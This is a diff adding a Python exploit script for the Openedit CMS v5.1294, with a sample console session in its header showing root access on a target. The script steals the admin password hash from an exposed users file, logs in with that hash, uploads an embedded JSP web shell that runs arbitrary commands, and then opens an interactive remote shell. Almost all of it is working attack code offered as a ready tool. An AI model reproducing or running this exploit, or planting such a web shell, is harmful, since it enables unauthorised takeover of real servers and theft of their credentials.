@@ -1,0 +1,238 @@
+#!/usr/bin/python
+#
+# Openedit <= v5.1294 Remote Code Execution Exploit
+# http://net-ninja.net/blog/?p=553
+# watch http://www.zeitgeistmovie.com/
+#
+# Explanation:
+# Vuln 1: Admin hash disclosure
+# Vuln 2: Login with the hash
+# Vuln 3: Unprotected file upload
+#
+# [mr_me@pluto openedit]$ sudo python ./openown.py -p localhost:8080 -t 192.168.1.7:8080 -d /
+# 
+# 	| ---------------------------------------------- |
+# 	| Openedit v5.1294 Remote Code Execution Explo!t |
+# 	| by mr_me - net-ninja.net --------------------- |
+# 
+# (+) Testing proxy @ localhost:8080.. proxy is found to be working!
+# (+) Stealing admin hash.. hash stolen ! DES:2JPGMLB8Y60=
+# (+) Logging into CMS.. logged in successfully
+# (+) Generating and executing upload.. shell upload was successful..
+# (+) Shell located @ http://192.168.1.7:8080/eb5b2052fc6c2f6252af578bb9a66cf3.jsp?cmd=[CMD]
+# (+) Entering interactive remote console (q for quit)
+#
+# root@192.168.1.7:8080# id
+# 
+# uid=0(root) gid=0(root) groups=0(root)
+# 
+# root@192.168.1.7:8080# uname -a
+# 
+# Linux steven-desktop 2.6.32-28-generic #55-Ubuntu SMP Mon Jan 10 21:21:01 UTC 2011 i686 GNU/Linux
+# 
+# root@192.168.1.7:8080# q
+# [mr_me@pluto openedit]$
+
+import sys, socket, urllib, re, urllib2, getpass
+from optparse import OptionParser
+from random import choice
+from cookielib import CookieJar
+
+try:
+	from poster.encode import multipart_encode
+	from poster.streaminghttp import register_openers
+except:
+	print "(!) Please download pyposter-04 to use this tool"
+	print "--> http://pypi.python.org/pypi/poster/0.4"
+	sys.exit(1)
+
+usage = "./%prog [<options>] -t [target] -d [directory]"
+usage += "\nExample: ./%prog -p localhost:8080 -t 192.168.1.15:8080 -d /ROOT2/openedit/"
+
+parser = OptionParser(usage=usage)
+parser.add_option("-p", type="string",action="store", dest="proxy",
+                  help="HTTP Proxy <server:port>")
+parser.add_option("-t", type="string", action="store", dest="target",
+                  help="The Target server <server:port>")
+parser.add_option("-d", type="string", action="store", dest="dirPath",
+                  help="Directory path to the CMS")
+
+(options, args) = parser.parse_args()
+
+def banner():
+    print "\n\t| ---------------------------------------------- |"
+    print "\t| Openedit v5.1294 Remote Code Execution Explo!t |"
+    print "\t| by mr_me - net-ninja.net --------------------- |\n"
+
+if len(sys.argv) < 5:
+    banner()
+    parser.print_help()
+    sys.exit(1)
+
+agents = ["Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)",
+        "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1)",
+        "Microsoft Internet Explorer/4.0b1 (Windows 95)",
+        "Opera/8.00 (Windows NT 5.1; U; en)"]
+
+agent = choice(agents)
+
+jspSname = "eb5b2052fc6c2f6252af578bb9a66cf3.jsp"
+jspShell = """
+<%@ page import="java.util.*,java.io.*"%>
+<%
+if (request.getParameter("cmd") != null) {
+String cmd = request.getParameter("cmd");
+Process p = Runtime.getRuntime().exec(cmd);
+OutputStream os = p.getOutputStream();
+InputStream in = p.getInputStream();
+DataInputStream dis = new DataInputStream(in);
+String disr = dis.readLine();
+out.println("lulzStart");
+while ( disr != null ) {
+out.println(disr);
+disr = dis.readLine();
+}
+out.println("lulzEnd");
+}
+%>
+"""
+
+def getProxy():
+    try:
+        proxy_handler = urllib2.ProxyHandler({'http': options.proxy})
+    except(socket.timeout):
+            print "\n(-) Proxy timed out"
+            sys.exit(1)
+    return proxy_handler
+
+def testProxy():
+	sys.stdout.write("(+) Testing proxy @ %s.. " % (options.proxy))
+	sys.stdout.flush()
+	opener = urllib2.build_opener(getProxy())
+	try:
+        	check = opener.open("http://www.google.com").read()
+    	except:
+        	check = 0
+        	pass
+    	if check >= 1:
+        	sys.stdout.write("proxy is found to be working!\n")
+        	sys.stdout.flush()
+    	else:
+        	print "proxy failed, exiting.."
+        	sys.exit(1)
+
+def doPost(exploit, cmd=None):
+	if options.proxy:
+		try:
+                        values = {'cmd' : cmd }
+                        data = urllib.urlencode(values)
+			proxyfier = urllib2.build_opener(getProxy())
+			proxyfier.addheaders = [('User-agent', agent)]
+			check = proxyfier.open(exploit, data).read()
+
+		except urllib2.HTTPError, error:
+                        check = error.read()
+			pass
+	else:
+		try:
+			req = urllib2.Request(exploit)
+                        req.addheaders = [('User-agent',agent)]
+			check = urllib2.urlopen(req).read()
+		except urllib2.HTTPError, error:
+			check = error.read()
+
+	return check
+    
+def interactiveAttack():
+        print "(+) Entering interactive remote console (q for quit)\n"
+        hn = "%s@%s# " % (getpass.getuser(), options.target)
+        cmd = ""
+        while cmd != 'q':
+                try:
+            		cmd = raw_input(hn)
+            		sploit = ("http://%s%s%s" % (options.target, options.dirPath, jspSname))
+                        resp = doPost(sploit, cmd)
+                        shellOutput = resp.split("lulzStart")[1].split("lulzEnd")[0]
+			print shellOutput.split('\r\n')[0]
+        	except:
+            		break
+
+def getAdminHash():
+	sys.stdout.write("(+) Stealing admin hash..")
+	sys.stdout.flush()
+	hashReq = ("http://%s%sopenedit/files/download/WEB-INF/users/admin.xml" % (options.target, options.dirPath))
+	resp = doPost(hashReq)
+	hash = re.search("<password>(.*)</password>", resp)
+	sys.stdout.write(" hash stolen ! %s\n" % (hash.group(1)))
+	sys.stdout.flush()
+	return hash.group(1)
+
+def tryUpload(cookie):
+        sys.stdout.write("(+) Creating shell and preparing.. ")
+        sys.stdout.flush()
+	adminCookie = re.search("JSESSIONID=(.*) for", str(cookie))
+	url = ("http://%s%sopenedit/filemanager/upload/uploadfile-finish.html" % (options.target, options.dirPath))
+
+	try:
+		writeShell = open(jspSname,'w')
+		writeShell.write(jspShell)
+		writeShell.close()
+	except:
+		print "(-) Exploit failed, you must have permission to write locally."
+		sys.exit(1)
+
+	register_openers()
+	datagen, headers = multipart_encode({"file": open(jspSname), "path": "/WEB-INF/base/"})
+	headers['Cookie'] = "JSESSIONID="+adminCookie.group(1)+";"
+	headers['User-agent'] = agent
+	request = urllib2.Request(url, datagen, headers)
+        request.set_proxy(options.proxy, 'http')
+	resp = urllib2.urlopen(request).read()
+	writeShell.close()
+	if re.search("UPLOAD SUCCESSFUL", resp):
+		sys.stdout.write("shell upload was successful!\n")
+		sploit = ("http://%s%s%s?cmd=[CMD]" % (options.target, options.dirPath, jspSname))
+		sys.stdout.write("(+) Shell located @ %s\n" % (sploit))
+		sys.stdout.flush()
+    
+def doLogin(adminHash):
+	sys.stdout.write("(+) Logging into CMS.. ")
+	sys.stdout.flush
+	adminIndex = "http://" + options.target + options.dirPath + "openedit/authentication/logon.html"
+	values = {'loginokpage' : '', 'accountname' : 'admin', 'password' : adminHash, 'submit' : 'Login'}
+	data = urllib.urlencode(values)
+	cj = CookieJar()
+    	if options.proxy:
+        	try:
+            		opener = urllib2.build_opener(getProxy(), urllib2.HTTPCookieProcessor(cj))
+                        opener.addheaders = [('User-agent', agent)]
+	            	check = opener.open(adminIndex, data).read()
+        	except:
+            		print "\n(-) Proxy connection failed to remote target"
+            		sys.exit(1)
+    	else:
+        	try:
+            		opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
+            		check = opener.open(adminIndex, data).read()
+            	except:
+            		print "(-) Target connection failed, check your address"
+            		sys.exit(1)
+	if not re.search("Please enter your password", check):
+        	sys.stdout.write("logged in successfully\n")
+        	sys.stdout.flush()
+		return cj
+    	else:
+        	sys.stdout.write("Login Failed! Exiting..\n")
+        	sys.stdout.flush()
+        	sys.exit(1)
+
+def main():
+	banner()
+	if options.proxy:
+		testProxy()
+	adminHash = getAdminHash()
+	adminCookie = doLogin(adminHash)
+	tryUpload(adminCookie)
+	interactiveAttack()
+if __name__ == "__main__":
+	main()
